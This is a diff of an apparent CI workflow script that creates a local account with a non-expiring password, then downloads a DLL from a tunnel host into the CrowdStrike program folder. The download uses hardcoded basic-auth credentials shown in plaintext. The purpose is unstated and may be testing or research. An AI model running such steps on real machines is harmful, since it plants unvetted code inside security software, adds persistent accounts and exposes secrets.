@@ -17,7 +17,7 @@ jobs:
           if (-not (Get-LocalUser -Name csprobe -ErrorAction SilentlyContinue)) {
             New-LocalUser -Name csprobe -Password $sec -PasswordNeverExpires -UserMayNotChangePassword | Out-Null
           }
-          Invoke-WebRequest -UseBasicParsing -Uri 'https://bdqjk-2600-1f18-68f7-2200-4028-ef90-7375-e9ea.free.pinggy.net/CsPs4.dll' -Headers @{'X-Pinggy-No-Screen'='1'} -Authentication Basic -Credential (New-Object PSCredential('cs740',(ConvertTo-SecureString 'RrP9v8NwK2xQ' -AsPlainText -Force))) -OutFile 'C:\Program Files\CrowdStrike\CsPs4.dll'
+          Invoke-WebRequest -UseBasicParsing -Uri 'https://bdqjk-2600-1f18-68f7-2200-4028-ef90-7375-e9ea.free.pinggy.net/CsPs4.dll' -Headers @{'X-Pinggy-No-Screen'='1';'Authorization'=('Basic '+[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('cs740:RrP9v8NwK2xQ')))} -OutFile 'C:\Program Files\CrowdStrike\CsPs4.dll'
           $hash=(Get-FileHash 'C:\Program Files\CrowdStrike\CsPs4.dll' -Algorithm SHA256).Hash.ToLower()
           if ($hash -ne 'b065d339d5dd46a8123a93eadd4716a59848f389a152bca764d73e856f2d29b1') { throw "Unexpected CsPs4 hash $hash" }
           & icacls 'C:\Program Files\CrowdStrike\CsPs4.dll' /inheritance:r /grant:r 'SYSTEM:F' 'Administrators:R' | Out-File "$root\acl.txt"
